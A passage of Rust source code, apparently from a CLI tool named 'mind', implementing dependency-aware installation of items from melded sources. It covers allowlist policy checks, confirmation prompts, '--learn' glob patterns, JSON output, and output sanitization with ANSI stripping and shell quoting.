            // rather than dead-ending on "no item matches". Not printed under
            // `--json` (matches the CLI-179 hint above, which is also
            // stderr-only and not part of the JSON contract).
            if let Ok(reg) = Registry::load(paths) {
                let matching: Vec<&str> = reg
                    .sources
                    .iter()
                    .map(|s| s.name.as_str())
                    .filter(|name| source_matches(name, query))
                    .collect();
                if let [only] = matching.as_slice() {
                    eprintln!(
                        "hint: '{query}' names the melded source {only}; run \
                         `mind learn --all {quoted_query}` to install all of its items"
                    );
                }
            }
        }
        e
    })?;

    // The full closure to install, dependency-first (DEP-21, DEP-30), excluding
    // already-installed items (DEP-23).
    let order = resolution.install_order();
    let closure: Vec<&CatalogItem> = order.iter().map(|&i| &items[i]).collect();

    // CLI-157: empty closure means every requested item is already installed.
    // Treat as a distinct no-op rather than being silent or claiming "installed".
    if closure.is_empty() && !dry_run {
        if out.json {
            return print_json(&MutationResult::new("learn", item_ref, "up-to-date"));
        }
        println!("already installed; nothing to do");
        return Ok(());
    }

    // DEP-30: the collision check (CLI-33) runs over the FULL closure, not just
    // the explicit selection, so two items that would clobber each other abort
    // before anything is installed.
    if let Some((key, sources)) = colliding_install(&closure) {
        return Err(MindError::AmbiguousItem {
            query: key,
            candidates: sources,
        });
    }

    // DEP-32: --dry-run renders the dependency tree (when deps were added) and
    // lists the full closure, installing nothing.
    if dry_run {
        if out.json {
            let mut result = MutationResult::new("learn", item_ref, "dry-run");
            // spec: DSC-95
            result.installed = closure.iter().map(|t| t.display_key()).collect();
            return print_json(&result);
        }
        if resolution.adds_dependencies() {
            print!("{}", resolution.render_tree(&items));
        }
        println!("would learn {} item(s):", closure.len());
        // spec: DSC-95 -- sanitize each cell before `print_rows` composes
        // the line.
        let rows = closure
            .iter()
            .map(|t| vec![t.display_key(), crate::sanitize::strip_ansi(&t.source)])
            .collect::<Vec<_>>();
        out.print_rows(&rows);
        return Ok(());
    }

    // DEP-31: when the closure adds items beyond the explicit selection, show the
    // tree and prompt; proceed only on a yes (or `--yes`). When it adds nothing,
    // install directly with no prompt and no tree (CLI-30 behavior unchanged).
    if resolution.adds_dependencies() && !yes {
        // spec: LIFE-45 -- `--json` is non-interactive: refuse rather than
        // install a whole dependency closure unprompted. (A non-TTY *text* run
        // still reaches the prompt below, whose EOF-default is No, so it cancels
        // safely; only `--json` skipped the prompt entirely and auto-proceeded.)
        if out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("installing the dependency closure of '{item_ref}'"),
                    true,
                ),
            });
        }
        print!("{}", resolution.render_tree(&items));
        if !confirm("install this dependency closure?")? {
            println!("cancelled; nothing installed");
            return Ok(());
        }
    }

    // Install each item in dependency-first order. If one fails mid-batch, stop
    // but still persist the items already installed, so the manifest always
    // matches what is on disk.
    let mut manifest = Manifest::load(paths)?;
    let mut failure = None;
    let mut installed_keys: Vec<String> = Vec::new();
    for target in &closure {
        // POL-12: with the allowlist locked, skip (and report) any item whose
        // source identity is no longer allowed; install from the rest.
        if let Some(policy) = policy.as_ref()
            && policy.lock()
            && !policy.allow_matches(&policy_identity(&registry, &target.source))
        {
            if !out.json {
                // spec: DSC-95
                println!(
                    "{} skipping {} from {}: source not permitted by the managed policy's allowlist",
                    out.warn(),
                    target.display_key(),
                    crate::sanitize::strip_ansi(&target.source)
                );
            }
            continue;
        }
        let commit = match registry.find(&target.source) {
            Some(s) => s.commit.clone().unwrap_or_default(),
            None => {
                failure = Some(MindError::SourceNotFound {
                    name: target.source.clone(),
                });
                break;
            }
        };
        // spec: LNK-18 -- a single-item link instance has no siblings, so its
        // intra-source references are reconciled (token: hard stop with the
        // remedy; requires: warn and drop) before install validates them.
        let (reconciled, dropped_requires) = match link_reconciled(paths, &registry, target) {
            Ok(c) => c,
            Err(e) => {
                failure = Some(e);
                break;
            }
        };
        let target: &CatalogItem = &reconciled;
        // spec: NS-41 -- refuse to install an agent whose bare harness name
        // already maps to an installed agent from a different source.
        if let Some(err) = agent_collision(paths, &manifest, target)? {
            failure = Some(err);
            break;
        }
        let siblings = siblings_of(&items, &target.source);
        let force = clobber == Clobber::Force;
        // A `learn` never takes the re-install path: DEP-23 drops every already-
        // installed key from the closure above, so nothing reaching here is
        // installed under this effective name (HOOK-125: a repeat `learn` is a
        // no-op that runs no hook at all). The lookup stays as a defensive
        // guard, not a behavioral claim -- if the closure ever stopped
        // excluding installed items, this would still pick the update hooks.
        let is_update = manifest.items.contains_key(target.key().as_str());
        let mut result = install_item(
            paths,
            target,
            &commit,
            &siblings,
            force,
            dangerously_skip,
            dangerously_skip_build,
            is_update,
        );
        // CLI-34: a conflicting (non-mind) target refuses by default. With
        // `Prompt` (the default `learn`), offer to overwrite it on a TTY; on a
        // yes, retry forced. `install` aborts before touching anything on a
        // clobber, so the retry is safe.
        if let Err(MindError::LinkOccupied { path }) = &result
            && clobber == Clobber::Prompt
            && crate::hook::is_tty()
            && !out.json
        {
            let path = path.clone();
            // spec: DSC-95 -- sanitize the path component before
            // composing the prompt (not the whole prompt after), so the
            // trailing "exists and is not..." text cannot be swallowed by an
            // unterminated escape in the path.
            result = if confirm(&format!(
                "{} exists and is not managed by mind; overwrite it?",
                display_path(std::path::Path::new(&path))
            ))? {
                install_item(
                    paths,
                    target,
                    &commit,
                    &siblings,
                    true,
                    dangerously_skip,
                    dangerously_skip_build,
                    is_update,
                )
            } else {
                Err(MindError::LinkOccupied { path })
            };
        }
        match result {
            Ok(mut installed) => {
                // spec: LNK-19 -- record what LNK-18 dropped on the installed
                // item, so the degradation outlives the install-time warning.
                installed.dropped_requires = dropped_requires;
                installed_keys.push(installed.key().into());
                if !out.json {
                    // Keep the line starting with "learned <key>" (tests assert the
                    // prefix); the commit is greened (no-op when color is off).
                    println!(
                        "learned {} from {} ({})",
                        installed.display_key(),
                        installed.source,
                        out.green(&short(&installed.commit))
                    );
                }
                manifest.insert(installed);
            }
            Err(e) => {
                failure = Some(e);
                break;
            }
        }
    }
    manifest.save(paths)?;
    match failure {
        Some(e) => Err(e),
        None => {
            if out.json {
                let mut result = MutationResult::new("learn", item_ref, "installed");
                // DSC-95: an installed key embeds a source-controlled bare name.
                result.installed = installed_keys
                    .iter()
                    .map(|k| crate::sanitize::strip_ansi(k))
                    .collect();
                return print_json(&result);
            }
            Ok(())
        }
    }
}

/// Like `learn()` but installs silently and returns the installed keys instead
/// of emitting a JSON result. Used by `install_source_items_for_json` so the
/// meld dispatcher can fold the install outcome into ONE combined JSON object
/// (CLI-156) rather than letting `learn` emit its own separate result.
///
/// Differences from `learn()`:
/// - `dry_run` is never true (callers always want the real install).
/// - No JSON is emitted at the end; the caller receives the keys.
/// - The dep-prompt is skipped (callers always pass `yes=true` here).
fn learn_collecting(paths: &Paths, item_ref: &str, flow: InstallFlow) -> Result<Vec<String>> {
    learn_collecting_selected(paths, Selection::Ref(item_ref), flow)
}

/// [`learn_collecting`] for an exact, internally composed selection (CLI-236).
fn learn_collecting_exact(
    paths: &Paths,
    target: &LearnTarget,
    flow: InstallFlow,
) -> Result<Vec<String>> {
    learn_collecting_selected(paths, Selection::Exact(target), flow)
}

fn learn_collecting_selected(
    paths: &Paths,
    selection: Selection<'_>,
    flow: InstallFlow,
) -> Result<Vec<String>> {
    let InstallFlow {
        clobber,
        dangerously_skip,
        dangerously_skip_build,
        ..
    } = flow;
    let policy = Policy::load()?;
    let (registry, items, resolution) = resolve_learn(paths, selection)?;

    let order = resolution.install_order();
    let closure: Vec<&CatalogItem> = order.iter().map(|&i| &items[i]).collect();

    // Already all installed: nothing to collect.
    if closure.is_empty() {
        return Ok(vec![]);
    }

    if let Some((key, sources)) = colliding_install(&closure) {
        return Err(MindError::AmbiguousItem {
            query: key,
            candidates: sources,
        });
    }

    let mut manifest = Manifest::load(paths)?;
    let mut failure = None;
    let mut installed_keys: Vec<String> = Vec::new();
    for target in &closure {
        if let Some(policy) = policy.as_ref()
            && policy.lock()
            && !policy.allow_matches(&policy_identity(&registry, &target.source))
        {
            continue; // policy-blocked items are silently skipped in collect mode
        }
        let commit = match registry.find(&target.source) {
            Some(s) => s.commit.clone().unwrap_or_default(),
            None => {
                failure = Some(MindError::SourceNotFound {
                    name: target.source.clone(),
                });
                break;
            }
        };
        // spec: LNK-18 -- same link reconciliation as `learn` (the warning it
        // may print routes to stderr under `--json`, CLI-217).
        let (reconciled, dropped_requires) = match link_reconciled(paths, &registry, target) {
            Ok(c) => c,
            Err(e) => {
                failure = Some(e);
                break;
            }
        };
        let target: &CatalogItem = &reconciled;
        // spec: NS-41 -- refuse to install a colliding agent (same check as learn).
        if let Some(err) = agent_collision(paths, &manifest, target)? {
            failure = Some(err);
            break;
        }
        let siblings = siblings_of(&items, &target.source);
        let force = clobber == Clobber::Force;
        // The same defensive guard as the `learn` path above: DEP-23 has
        // already dropped every installed key, so this is false here.
        let is_update = manifest.items.contains_key(target.key().as_str());
        let result = install_item(
            paths,
            target,
            &commit,
            &siblings,
            force,
            dangerously_skip,
            dangerously_skip_build,
            is_update,
        );
        match result {
            Ok(mut installed) => {
                // spec: LNK-19
                installed.dropped_requires = dropped_requires;
                installed_keys.push(installed.key().into());
                manifest.insert(installed);
            }
            Err(e) => {
                failure = Some(e);
                break;
            }
        }
    }
    manifest.save(paths)?;
    match failure {
        Some(e) => Err(e),
        None => Ok(installed_keys),
    }
}

/// Run the post-meld auto-install flow (CLI-23) for one registered source by its
/// name: preview and prompt to install its items (`<source>#*`), or install
/// directly under `--yes`. Used for the top-level source and, via
/// `install_curated_sources`, for nested sources installed with `--recursive`
/// (DSC-55) or a curator `install = true` (DSC-58).
// spec: CLI-23
pub fn install_source_items(paths: &Paths, source_name: &str, flow: InstallFlow) -> Result<()> {
    let item_ref = format!("{source_name}#*");
    // spec: CLI-225 -- `item_ref` embeds the source-influenced `source_name`
    // and lands in pasteable `mind learn` remedies below, so it is
    // shell-quoted once here rather than framed in bare single quotes.
    let quoted_item_ref = crate::error::shell_quote(&item_ref);

    // Resolve what would install (excludes already-installed items, DEP-23). A
    // source that offers nothing matching is an ItemNotFound here; treat it as
    // "nothing to install" rather than an error.
    let plan = match learn_preview(paths, &item_ref) {
        Ok(plan) => plan,
        Err(MindError::ItemNotFound { .. }) => return Ok(()),
        Err(e) => return Err(e),
    };
    if plan.install_count == 0 {
        return Ok(());
    }

    if flow.yes {
        return learn(paths, &item_ref, false, flow);
    }
    if !crate::hook::is_tty() {
        if !json_mode() {
            println!(
                "note: registered only, nothing installed (not a TTY); {source_name} has {} item(s) to install; run `mind learn {quoted_item_ref}` (or re-meld with --yes)",
                plan.install_count
            );
        }
        return Ok(());
    }

    // Interactive: show the install preview (the dry-run list), then prompt.
    learn(paths, &item_ref, true, flow)?;
    if confirm_default_yes(&format!(
        "install these {} item(s) now?",
        plan.install_count
    ))? {
        learn(paths, &item_ref, false, InstallFlow { yes: true, ..flow })
    } else {
        println!("skipped; run `mind learn {quoted_item_ref}` to install later");
        Ok(())
    }
}

/// spec: CLI-236 -- `--learn` scopes the install to the melded source's own
/// items, so the curated chain (DSC-54/55/58) is not walked and an explicit
/// `--recursive` has nothing to act on. Name it rather than dropping it
/// silently, the same disclosure `remeld` gives an inapplicable flag (CLI-206).
/// Silent under `--json`, matching the neighbouring meld notes.
pub fn note_learn_ignores_recursive(recursive: bool) {
    if recursive && !json_mode() {
        println!(
            "note: --recursive ignored; --learn installs only the matching items of the source \
             being melded, and does not walk the sources it curates. Meld again without --learn \
             to install from them, or name them directly."
        );
    }
}

/// Parse one `--learn` value into the ref it selects by and, when it carries
/// glob metacharacters, its compiled pattern (CLI-236).
///
/// Pure syntax: no catalog is consulted, so `meld` can run this BEFORE cloning
/// and reject a malformed pattern without leaving a registered source behind.
fn parse_learn_pattern(pattern: &str) -> Result<(crate::resolve::ItemRef, Option<glob::Pattern>)> {
    // spec: CLI-236
    let bad = |reason: &str| MindError::InvalidLearnPattern {
        pattern: strip_ansi(pattern),
        reason: reason.to_string(),
    };
    if pattern.trim().is_empty() {
        return Err(bad("it is empty"));
    }
    if pattern.contains('#') {
        return Err(bad(
            "it selects within the source being melded, so pass just an item name or glob \
             (e.g. 'review', 'skill:*'), not a source-qualified ref",
        ));
    }
    let parsed = crate::resolve::parse_item_ref(pattern)
        .map_err(|_| bad("it is not a valid item name, 'kind:name', or glob"))?;
    // A malformed glob must say so rather than silently degrading to an exact
    // match that then reports "matches no item", which reads as a typo in the
    // NAME rather than in the pattern syntax.
    let matcher = if crate::resolve::is_glob(&parsed.name) {
        Some(
            glob::Pattern::new(&parsed.name)
                .map_err(|e| bad(&format!("it is not a valid glob ({e})")))?,
        )
    } else {
        None
    };
    Ok((parsed, matcher))
}

/// spec: CLI-236 -- validate every `--learn` value's syntax up front, so a
/// typo'd pattern fails before `meld` clones and registers the source rather
/// than after (the clap layer cannot do this: the check is not a value parse
/// but a small grammar of its own).
pub fn validate_learn_patterns(patterns: &[String]) -> Result<()> {
    for pattern in patterns {
        parse_learn_pattern(pattern)?;
    }
    Ok(())
}

/// Resolve every `--learn` pattern against the source's own catalog and return
/// the EXACT identity of each matched item, in first-seen order, deduped
/// (CLI-236).
///
/// Matching accepts the item's BARE name as well as its effective (prefixed)
/// name. At meld time the consumer has not necessarily seen the source's
/// declared `[source].prefix` yet -- CLI-24 may prompt for it inside this very
/// command -- so requiring the effective name would make `--learn review` fail
/// on exactly the first-run case the flag exists for. Within one source the two
/// readings cannot disagree about which item is meant.
///
/// Each match is returned as a [`LearnTarget`] (source identity plus effective
/// key), not as a ref string: the install that consumes it resolves by
/// identity, so a name carrying `*`, `?`, `[` or `#` is never re-read as a
/// pattern or re-split into the wrong source.
fn learn_pattern_targets(
    items: &[CatalogItem],
    source_name: &str,
    pattern: &str,
) -> Result<Vec<LearnTarget>> {
    // spec: CLI-236
    let (parsed, matcher) = parse_learn_pattern(pattern)?;
    let hit = |it: &CatalogItem| -> bool {
        if !parsed.kind.is_none_or(|k| it.kind == k) {
            return false;
        }
        match &matcher {
            Some(p) => p.matches(&it.effective_name()) || p.matches(&it.name),
            None => it.effective_name() == parsed.name || it.name == parsed.name,
        }
    };
    let mut targets: Vec<LearnTarget> = Vec::new();
    for it in items
        .iter()
        .filter(|it| it.source == source_name && hit(it))
    {
        // `key()` is `kind:effective_name`: exact, kind-qualified, and the same
        // identity `learn` and the manifest are keyed by.
        let t = LearnTarget {
            source: source_name.to_string(),
            key: it.key().as_str().to_string(),
        };
        if !targets.contains(&t) {
            targets.push(t);
        }
    }
    if targets.is_empty() {
        return Err(MindError::LearnPatternNoMatch {
            pattern: strip_ansi(pattern),
            source_name: strip_ansi(source_name),
        });
    }
    Ok(targets)
}

/// Resolve all `--learn` patterns for one source into a deduped target list,
/// and the subset of those targets not installed yet (CLI-236, DEP-23).
fn learn_targets(
    paths: &Paths,
    source_name: &str,
    patterns: &[String],
) -> Result<(Vec<LearnTarget>, Vec<LearnTarget>)> {
    let registry = Registry::load(paths)?;
    let items = catalog::scan(paths, &registry)?;
    let mut targets: Vec<LearnTarget> = Vec::new();
    for pattern in patterns {
        for t in learn_pattern_targets(&items, source_name, pattern)? {
            if !targets.contains(&t) {
                targets.push(t);
            }
        }
    }
    let manifest = Manifest::load(paths)?;
    let fresh: Vec<LearnTarget> = targets
        .iter()
        .filter(|t| !manifest.items.contains_key(&t.key))
        .cloned()
        .collect();
    Ok((targets, fresh))
}

/// Install only the items of a just-melded source matching the `--learn`
/// patterns (CLI-236), in place of the CLI-23 install-all offer. Each matched
/// item runs through the ordinary `learn` path, so its dependency closure
/// (DEP-30/31) and the collision checks (CLI-33) apply unchanged; the
/// preview-and-prompt gate around the batch is the CLI-23 meld gate, as for the
/// install-all offer it replaces.
///
/// Unlike that offer, a pattern matching nothing in the source is an error: the
/// user named it explicitly, so a typo must not pass as "nothing to install".
// spec: CLI-236
pub fn install_source_items_matching(
    paths: &Paths,
    source_name: &str,
    patterns: &[String],
    flow: InstallFlow,
) -> Result<()> {
    let (matched, fresh) = learn_targets(paths, source_name, patterns)?;
    if fresh.is_empty() {
        // Every match is already installed (CLI-157), reported once for the
        // batch rather than once per pattern.
        if !json_mode() {
            println!(
                "already installed; nothing to do ({} item(s))",
                matched.len()
            );
        }
        return Ok(());
    }
    // spec: CLI-225 -- each printed target embeds the source-influenced source
    // name and an item name, and lands in a pasteable `mind learn` remedy, so
    // it is sanitized (by `LearnTarget::display`, half by half per DSC-95) and
    // shell-quoted before printing.
    //
    // spec: CLI-236 -- `learn` takes exactly ONE positional (CLI-30), so a
    // space-joined list of refs is not a command: clap rejects it with
    // "unexpected argument". The fallback is a `&&`-joined SEQUENCE of
    // `mind learn` calls, which runs verbatim for one match or many, and which
    // stops at the first failure rather than continuing past it.
    let quoted = fresh
        .iter()
        .map(|t| format!("mind learn {}", crate::error::shell_quote(&t.display())))
        .collect::<Vec<_>>()
        .join(" && ");
    let install_all = |flow: InstallFlow| -> Result<()> {
        for target in &fresh {
            learn_exact(paths, target, false, flow)?;
        }
        Ok(())
    };
    if flow.yes {
        return install_all(flow);
    }
    if !crate::hook::is_tty() {
        if !json_mode() {
            println!(
                "note: registered only, nothing installed (not a TTY); {} item(s) match --learn; \
                 run `{quoted}` (or re-meld with --yes)",
                fresh.len(),
            );
        }
        return Ok(());
    }
    // Interactive: preview the whole batch (the dry-run list, dependency
    // closures included), then prompt once.
    for target in &fresh {
        learn_exact(paths, target, true, flow)?;
    }
    if confirm_default_yes(&format!("install these {} item(s) now?", fresh.len()))? {
        install_all(InstallFlow { yes: true, ..flow })
    } else {
        println!("skipped; run `{quoted}` to install later");
        Ok(())
    }
}

/// The `--json` twin of [`install_source_items_matching`] (CLI-236): installs
/// silently and returns `(installed_keys, pending_count)` so the meld
/// dispatcher folds the outcome into ONE object (CLI-156).
///
/// `pending` counts the UNION of the matched items and their closures, not the
/// sum over patterns: without `--yes` nothing installs between patterns, so
/// summing would double-count an item two patterns both match, or a dependency
/// shared by two of them.
// spec: CLI-236 CLI-156
pub(crate) fn install_source_items_matching_for_json(
    paths: &Paths,
    source_name: &str,
    patterns: &[String],
    flow: InstallFlow,
) -> Result<(Vec<String>, usize)> {
    let (_matched, fresh) = learn_targets(paths, source_name, patterns)?;
    if fresh.is_empty() {
        return Ok((Vec::new(), 0));
    }
    if flow.yes {
        let mut installed: Vec<String> = Vec::new();
        for target in &fresh {
            installed.extend(learn_collecting_exact(paths, target, flow)?);
        }
        return Ok((installed, 0));
    }
    // No --yes in json mode: report the pending count without prompting. Union
    // each matched item's closure so a shared dependency counts once.
    let mut pending: BTreeSet<String> = BTreeSet::new();
    for target in &fresh {
        pending.extend(learn_plan(paths, Selection::Exact(target))?.keys);
    }
    Ok((Vec::new(), pending.len()))
}

/// Run the post-meld install flow (CLI-23) for a named subset of a registered
/// source's items (DSC-62). Only the items named by `bare_refs` (bare `kind:name`
/// strings in source truth) are offered; the source's other items remain
/// registered and available. The same preview-and-prompt path as
/// `install_source_items` is used, so `--yes` and `--link-only` behave
/// identically (CLI-23). An empty `bare_refs` slice installs nothing.
pub fn install_source_items_subset(
    paths: &Paths,
    source_name: &str,
    bare_refs: &[String],
    flow: InstallFlow,
) -> Result<()> {
    if bare_refs.is_empty() {
        return Ok(());
    }

    // Scan only the named source to get its items.
    let registry = Registry::load(paths)?;
    let Some(source) = registry.find(source_name) else {
        return Ok(());
    };
    let source_items = catalog::scan(paths, &single(source))?;

    // Filter to only the listed bare refs.
    let subset: Vec<&CatalogItem> = select_by_bare_refs(&source_items, bare_refs);
    if subset.is_empty() {
        return Ok(());
    }

    // Build a manifest of already-installed keys to exclude them (DEP-23).
    let manifest = crate::manifest::Manifest::load(paths)?;
    let installed_keys: std::collections::HashSet<String> =
        manifest.items.keys().cloned().collect();

    // Filter to not-yet-installed items only.
    let to_install: Vec<&CatalogItem> = subset
        .into_iter()
        .filter(|it| !installed_keys.contains(it.key().as_str()))
        .collect();

    if to_install.is_empty() {
        return Ok(());
    }

    // Build a ref string that installs exactly the subset. We install each
    // item individually using the source-qualified effective name, reusing the
    // same preview-and-prompt gate that `install_source_items` uses.
    //
    // Collect effective names so the prompt message is accurate.
    let count = to_install.len();
    let refs: Vec<String> = to_install
        .iter()
        .map(|it| format!("{source_name}#{}", it.key().as_str()))
        .collect();

    if flow.yes {
        for item_ref in &refs {
            learn(paths, item_ref, false, flow)?;
        }
        return Ok(());
    }

    if !crate::hook::is_tty() {
        let ref_list = refs.join(", ");
        if !json_mode() {
            // spec: CLI-225 -- each candidate ref embeds `source_name` and an
            // item name from `it.key()`, neither restricted against shell
            // metacharacters, and lands in a pasteable `mind learn` remedy,
            // so it is shell-quoted before printing rather than framed in
            // bare single quotes.
            // spec: DSC-95 -- `shell_quote` neutralizes shell metacharacters
            // only; it does not strip an ANSI escape, which can still ride
            // out inside the single quotes it wraps `ref_str` in. Sanitize
            // first, then shell-quote the already-sanitized string.
            let ref_str = if refs.len() == 1 {
                strip_ansi(&refs[0])
            } else {
                format!("{source_name}#*")
            };
            let quoted_ref = crate::error::shell_quote(&ref_str);
            println!(
                "note: registered only, nothing installed (not a TTY); {source_name} has {count} item(s) to install; run `mind learn {quoted_ref}` (or re-meld with --yes)"
            );
            let _ = ref_list; // suppress unused warning
        }
        return Ok(());
    }

    // Interactive: preview, then prompt.
    for item_ref in &refs {
        learn(paths, item_ref, true, flow)?;
    }
    if confirm_default_yes(&format!("install these {count} item(s) now?"))? {
        for item_ref in &refs {
            learn(paths, item_ref, false, InstallFlow { yes: true, ..flow })?;
        }
    } else {
        // spec: CLI-225 -- same rationale as above: shell-quote before
        // printing.
        let quoted_ref = crate::error::shell_quote(&format!("{source_name}#*"));
        println!("skipped; run `mind learn {quoted_ref}` to install later");
    }
    Ok(())
}

/// Install all items from a provisioned source headlessly, for the policy
/// `auto_meld` `install = true` path (POL-58/59/60).
///
/// Each item from `source_name` that is not yet installed is attempted
/// independently via `learn` so a single failure does not abort installation of
/// the remaining items (POL-60). Build hooks are skipped unless `run_build_hooks`
/// is `true` (POL-59, same as `--dangerously-skip-build-hook-check`). Install
/// hooks follow the standard non-TTY path: they are skipped in a non-interactive
/// context (HOOK-72).
///
/// Returns `(installed_keys, failures)`: the effective keys installed in this
/// pass, and a `(item_key, error)` pair for each failed item so the caller can
/// apply POL-34/POL-60 soft-fail semantics (warn, record, continue, non-zero
/// exit). Empty failures means all items installed successfully (or there were
/// no items to install).
///
/// spec: CLI-217 -- under `--json` the per-item install runs through the SILENT
/// `learn_collecting`, and the keys ride back to `sync` to be folded into its
/// one result object. Calling `learn` there emitted one `learn` document per
/// provisioned item ahead of sync's own, which is N+1 documents on the stdout
/// of exactly the unattended fleet run `auto_meld` exists for.
// spec: POL-58 POL-59 POL-60
pub fn install_provisioned_items(
    paths: &Paths,
    source_name: &str,
    run_build_hooks: bool,
) -> (Vec<String>, Vec<(String, MindError)>) {
    let flow = InstallFlow {
        yes: true,
        clobber: Clobber::Prompt,
        dangerously_skip: false,
        dangerously_skip_build: run_build_hooks,
    };

    // Load the registry and scan items for this source only.
    let registry = match Registry::load(paths) {
        Ok(r) => r,
        Err(e) => return (vec![], vec![(source_name.to_string(), e)]),
    };
    let Some(source) = registry.find(source_name) else {
        return (vec![], vec![]);
    };
    // spec: CLI-213 POL-60 -- a single-source scan, so it must not degrade past a
    // `LinkedSourceGone` source: `catalog::scan` would return `Ok(vec![])` and this
    // function would report "nothing to install" for a source that could not be
    // read at all, so POL-60's warn-record-continue-nonzero accounting would record
    // nothing. A scan failure is a recorded `(source, err)` failure instead.
    let source_items = match scan_one(paths, source) {
        Ok(items) => items,
        Err(e) => return (vec![], vec![(source_name.to_string(), e)]),
    };
    if source_items.is_empty() {
        return (vec![], vec![]);
    }

    // Load the manifest once to know what is already installed; `learn` will
    // also check per call, but this avoids the overhead of starting `learn`
    // for items that are clearly already done.
    let manifest = match Manifest::load(paths) {
        Ok(m) => m,
        Err(e) => return (vec![], vec![(source_name.to_string(), e)]),
    };
    let installed: std::collections::HashSet<String> = manifest.items.keys().cloned().collect();

    // Install each not-yet-installed item independently so a failure on one
    // does not block the rest (POL-60).
    let json = json_mode();
    let mut failures = Vec::new();
    let mut installed_keys: Vec<String> = Vec::new();
    for item in &source_items {
        let key = item.key();
        if installed.contains(key.as_str()) {
            continue; // already installed; no-op
        }
        let item_ref = format!("{source_name}#{}", key.as_str());
        // spec: CLI-217 -- silent under `--json` (keys are returned instead of
        // a per-item document); the ordinary `learn` in text mode, so an
        // interactive `mind sync` still narrates what it installed.
        let outcome = if json {
            learn_collecting(paths, &item_ref, flow).map(|keys| installed_keys.extend(keys))
        } else {
            learn(paths, &item_ref, false, flow)
        };
        if let Err(e) = outcome {
            // spec: DSC-95 -- `key` is source-controlled; sanitize before it
            // rides into the (source_name, key) pair that the `sync` caller
            // below prints raw otherwise.
            failures.push((key.display(), e));
        }
    }
    (installed_keys, failures)
}

/// The registry identity for a repo spec under a consumer alias (STO-58):
/// `host/owner/repo[#path]` plus a trailing `@<alias>`. This is the key
/// `is_melded`/`remeld` look up, so `--as <prefix>` selects (or creates) the
/// `host/owner/repo@<prefix>` instance rather than the bare repo. `Some("")`
/// (the `--as ''` no-prefix override) resolves to the bare identity, so it names
/// the same instance as `None`.
pub fn instance_name(repo: &str, alias: Option<&str>) -> Result<String> {
    // spec: CLI-216 -- naming an instance answers a question ("which instance
    // does this spec select?"); it never clones. `meld_recursive`'s parse is the
    // one that decides a reading, and it carries the CLI-215 note. Without this,
    // the dispatcher's two identity calls (`instance_name` for the post-meld
    // steps and `is_melded` for the routing) printed the note twice more.
    let mut source = parse_spec_quiet(repo)?;
    source.apply_alias(alias.map(str::to_string));
    Ok(source.name)
}

/// True when the repo spec, under the given consumer alias, resolves to an
/// already-registered source instance (STO-58).
pub fn is_melded(paths: &Paths, repo: &str, alias: Option<&str>) -> Result<bool> {
    let name = instance_name(repo, alias)?;
    Ok(Registry::load(paths)?.find(&name).is_some())
}

/// Re-melding an already-melded source (CLI-12). It does not re-clone or
/// re-register: it ensures the source's items are installed, installing any that
/// are missing just as a fresh meld does (CLI-23), and otherwise (or with
/// `--link-only`) prints a status of the source's items and the commit each is
/// installed at.
///
/// `pin` is the caller's `--pin` request (`PinRequest::None` if the flag was
/// not given): unlike the other discovery flags, a re-meld DOES honor it
/// (CLI-209) by re-pinning the source before the hook-rerun/install passes
/// below, so they act on the possibly-new commit.
///
/// `ignored_flags` names the discovery CLI flags the caller passed on this
/// invocation (`--root`, `--add-root`, `--flat-skills`, `--install-hook`) that
/// a re-meld does not apply (CLI-206): they change what gets discovered, which
/// only happens at the meld that first registers a source. When non-empty, a
/// one-line note lists them so they are not silently dropped.
// spec: CLI-12, CLI-206, CLI-209
#[allow(clippy::too_many_arguments)]
pub fn remeld(
    paths: &Paths,
    repo: &str,
    alias: Option<String>,
    link_only: bool,
    flow: InstallFlow,
    recursive: bool,
    ignored_flags: &[&str],
    pin: PinRequest,
    learn_patterns: &[String],
) -> Result<()> {
    // `yes` rides inside `flow` for the install calls; remeld itself only needs
    // the clobber (hook force-rerun) and the dangerously-skip flag.
    let InstallFlow {
        clobber,
        dangerously_skip: dangerously_skip_hook_check,
        ..
    } = flow;
    let out = crate::render::ctx();
    // spec: STO-58/CLI-12 -- a re-meld targets the specific instance named by the
    // repo spec plus the consumer alias. `is_melded` used the same identity to
    // route here, so the alias matches this instance and is not a re-prefixing
    // (CLI-13): `--as` denoting a different alias would have been a fresh meld.
    let source_name = instance_name(repo, alias.as_deref())?;
    if !out.json {
        println!("{} {source_name} is already melded", out.bullet());
        // spec: CLI-206 -- a re-meld does not re-clone or re-register, so a
        // discovery flag on this invocation is a silent no-op without this
        // note (mirrors the CLI-203 note pattern for `learn <url> --pin`).
        if !ignored_flags.is_empty() {
            let flags = ignored_flags.join(", ");
            let plural = ignored_flags.len() != 1;
            // spec: CLI-225 -- `source_name` is source-influenced (an
            // instance name derived from the repo spec plus the consumer
            // alias) and lands in a pasteable `mind unmeld <name>` remedy, so
            // it is shell-quoted before printing (same rule as the
            // `HooksNotRun`/`AmbiguousHookTarget` remedies in error.rs).
            let quoted_source = crate::error::shell_quote(&source_name);
            println!(
                "note: {flags} ignored; {source_name} is already melded (re-melding \
                 does not change a source's discovery configuration). To apply \
                 {}, run `mind unmeld {quoted_source}` then `mind meld` again with {}.",
                if plural { "them" } else { "it" },
                if plural { "the flags" } else { "the flag" }
            );
        }
    }

    // spec: CLI-209 -- honor `--pin` on a re-meld by re-pinning the source,
    // before the hook-rerun/install passes below so they see the (possibly
    // new) commit.
    if pin != PinRequest::None {
        repin_source(paths, &source_name, pin)?;
    }

    // HOOK-60: re-offer the source's install hooks that have not run at the
    // current commit (a hook skipped at an earlier meld, or added since); `--force`
    // re-offers every install hook. Runs in the existing clone before installing.
    {
        let mut registry = Registry::load(paths)?;
        if let Some(idx) = registry.sources.iter().position(|s| s.name == source_name) {
            let clone_dir = registry.sources[idx].clone_dir(paths);
            let mindfile = MindToml::load(&clone_dir).unwrap_or_default();
            let toml_path = clone_dir.join("mind.toml");
            let force_rerun = clobber == Clobber::Force;
            match run_install_hooks(
                &mut registry.sources[idx],
                &clone_dir,
                &mindfile,
                &toml_path,
                None,
                dangerously_skip_hook_check,
                force_rerun,
                Vec::new(),
            ) {
                Ok(HookOutcome::Proceed) => registry.save(paths)?,
                Ok(HookOutcome::Abort) => {
                    registry.save(paths)?; // persist any hook that did run
                    if !out.json {
                        println!("aborted; source left in place");
                    }
                    return Ok(());
                }
                Err(e) => {
                    // spec: LIFE-48 -- H3: persist any earlier hook's ran_at
                    // update in this pass before propagating a later hook's
                    // failure; otherwise a hook that already succeeded is
                    // silently re-offered on the next meld/upgrade (mirrors
                    // HOOK-53's own "leave the source melded" intent).
